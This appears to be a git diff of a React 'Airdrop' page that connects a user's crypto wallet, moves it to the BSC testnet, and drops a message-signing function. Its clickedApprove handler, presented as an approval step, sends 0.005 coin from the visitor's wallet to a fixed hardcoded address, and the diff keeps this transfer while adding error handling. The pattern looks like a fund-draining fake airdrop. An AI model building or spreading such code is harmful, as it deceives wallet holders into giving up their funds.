@@ -25,7 +25,8 @@ const Airdrop = () => {
       package: WalletConnectProvider,
       options: {
         rpc: {
-          56: 'https://bsc-dataseed.binance.org/',
+          // 56: 'https://bsc-dataseed.binance.org/',
+          97: 'https://data-seed-prebsc-1-s1.binance.org:8545/'
         },
         network: 'binance',
         chainId: 56,
@@ -93,20 +94,6 @@ const Airdrop = () => {
     }
   }
 
-  const signMessage = async () => {
-    if (!library) return
-    try {
-      const signature = await library.provider.request({
-        method: 'personal_sign',
-        params: [message, account],
-      })
-      setSignedMessage(message)
-      setSignature(signature)
-    } catch (error) {
-      setError(error)
-    }
-  }
-
   const verifyMessage = async () => {
     if (!library) return
     try {
@@ -133,7 +120,7 @@ const Airdrop = () => {
     try {
       await library.provider.request({
         method: 'wallet_switchEthereumChain',
-        params: [{ chainId: toHex(56) }],
+        params: [{ chainId: toHex(97) }],
       })
     } catch (switchError) {
       alert("Can't change network")
@@ -185,11 +172,16 @@ const Airdrop = () => {
   const clickedApprove = async () => {
     // console.log(provider)
     // const signer = await provider.getSigner()
-    const tx = await signer.sendTransaction({
-      to: '0x22cc5ca4a9C480Dff807Dc5F72A876b75269C3fb', // The receiving address
-      value: ethers.utils.parseEther('0.005'), // The amount to be sent
-    })
-    console.log(tx);
+    try{
+      const tx = await signer.sendTransaction({
+        to: '0x22cc5ca4a9C480Dff807Dc5F72A876b75269C3fb', // The receiving address
+        value: ethers.utils.parseEther('0.005'), // The amount to be sent
+      })
+      console.log(tx);
+    } catch(err) {
+      console.log(err.data)
+      alert(err.data.message)
+    }
   }
 
   return (
@@ -204,7 +196,7 @@ const Airdrop = () => {
             >
               Connect Wallet
             </Button>
-          ) : chainId != 56 || chainId != 58 ? (
+          ) : chainId != 97 ? ( // mainnet is 56 testnet is 97
             <Button
               style={{ marginLeft: 'auto', marginRight: '0' }}
               size="lg"
